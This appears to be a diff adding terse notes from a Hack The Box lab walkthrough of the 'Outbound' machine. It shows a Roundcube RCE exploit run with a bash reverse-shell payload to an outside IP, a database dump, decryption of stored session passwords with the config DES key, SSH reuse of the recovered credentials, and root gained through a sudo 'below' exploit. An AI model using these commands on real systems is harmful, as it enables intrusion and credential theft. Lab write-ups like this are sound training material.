@@ -1,0 +1,152 @@
+22 and 80 tcp open
+
+http://mail.outbound.htb/
+
+Roundcube Webmail 1.6.10
+
+Installed plugins
+Plugin	Version	License	Source
+archive	4.5	GPL-3.0+	
+filesystem_attachments	1.0	GPL-3.0+	
+jqueryui	1.13.2	GPL-3.0+	
+zipdownload	3.4	GPL-3.0+	
+
+└─$ searchsploit roundcube 1.6.10
+---------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                        |  Path
+---------------------------------------------------------------------- ---------------------------------
+Roundcube 1.6.10 - Remote Code Execution (RCE)                        | multiple/webapps/52324.NA
+---------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+php CVE-2025-49113-exploit/CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 'bash -c "bash -i >& /dev/tcp/10.10.16.96/1234 0>&1"' 
+
+
+$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
+
+// This key is used to encrypt the users imap password which is stored
+// in the session record. For the default cipher method it must be
+// exactly 24 characters long.
+// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
+$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
+
+
+
+mysqldump -u roundcube -p roundcube > /tmp/db.sql
+
+
+INSERT INTO `users` VALUES
+(1,'jacob','localhost','2025-06-07 13:55:18','2025-06-11 07:52:49','2025-06-11 07:51:32',1,'en_US','a:1:{s:11:\"client_hash\";s:16:\"hpLLqLwmqbyihpi7\";}'),
+(2,'mel','localhost','2025-06-08 12:04:51','2025-06-08 13:29:05',NULL,NULL,'en_US','a:1:{s:11:\"client_hash\";s:16:\"GCrPGMkZvbsnc3xv\";}'),
+(3,'tyler','localhost','2025-06-08 13:28:55','2025-10-07 12:53:18','2025-06-11 07:51:22',1,'en_US','a:2:{s:11:\"client_hash\";s:16:\"SwHxv9cWmlEkugYX\";i:0;b:0;}');
+
+
+www-data@mail:/tmp$ ls /home
+ls /home
+jacob
+mel
+tyler
+
+
+/var/www/html/roundcube can be used to exfil data
+
+
+cat session_rows.txt| cut -d "," -f4 | tr -d "'\);" | xargs -I{} bash -c 'echo {} | base64 -d; echo' > session_rows_decoded.txt
+
+
+https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Triple_DES_Decrypt(%7B'option':'UTF8','string':'rcmail-!24ByteDESkey*Str'%7D,%7B'option':'Base64','string':'pIauAw20hLc%3D'%7D,'CBC','Raw','Raw')&input=b1AyMkgveFBFUXlOV3FMajFlQTBjdz09
+
+[
+  { "op": "From Base64",
+    "args": ["A-Za-z0-9+/=", true, false] },
+  { "op": "Triple DES Decrypt",
+    "args": [{ "option": "UTF8", "string": "rcmail-!24ByteDESkey*Str" }, { "option": "Base64", "string": "pIauAw20hLc=" }, "CBC", "Raw", "Raw"] }
+]
+
+the iv is b64d(cipher)[0:8]
+the actual ciphertex is b64d(cipher)[8:]
+re-b64e to pass into cyberchef
+
+# split the IV and ciphertext
+https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Take_bytes(0,8,false/disabled)Drop_bytes(0,8,false)To_Base64('A-Za-z0-9%2B/%3D')&input=TDdSdjAwQThUdXdKQXI2N2tJVHh4Y1NnbklrMjVBbS8&oeol=CR
+
+decrypted tyler and of course it's the same as what was provided
+i guess theoretically the password could have changed and older one is for ssh
+tyler:LhKL1o9Nm3X2
+
+let's check the other user password in case one of them is re-used for ssh login
+
+jacob decrypted to creds.txt
+
+mel does not have a session
+
+jacob ssh login failed with 
+└─$ sshpass -p595mO8DmwGeD ssh jacob@outbound.htb
+Permission denied, please try again.
+
+so try webmail
+and it works
+
+there are 2 messages
+
+Important Update
+--
+Due to the recent change of policies your password has been changed.
+
+Please use the following credentials to log into your account: gY4Wr3a1evp4
+
+Remember to change your password when you next log into your account.
+
+Thanks!
+
+Tyler
+--
+
+Unexpected resource consumption
+--
+We have been experiencing high resource consumption on our main server.
+For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
+Please inform us immediately if you notice any irregularities.
+
+Thanks!
+
+Mel
+--
+
+==
+
+└─$ sshpass -pgY4Wr3a1evp4 ssh jacob@outbound.htb
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)
+
+jacob@outbound:~$ cat user.txt
+e75e908d1fc10c9d2fd2e42624ac051b
+
+jacob@outbound:/var/log$ sudo su
+[sudo] password for jacob: 
+Sorry, user jacob is not allowed to execute '/usr/bin/su' as root on outbound.
+jacob@outbound:/var/log$ sudo -l
+Matching Defaults entries for jacob on outbound:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jacob may run the following commands on outbound:
+    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*,
+        !/usr/bin/below -d*
+
+
+https://github.com/facebookincubator/below
+
+
+this poc worked https://github.com/umutcamliyurt/CVE-2025-27591/blob/main/exploit.sh
+
+root@outbound:~# cat root.txt
+cfc6fee24db32fd1d0c728b403336783
+
+
+
+
+
+
+
+
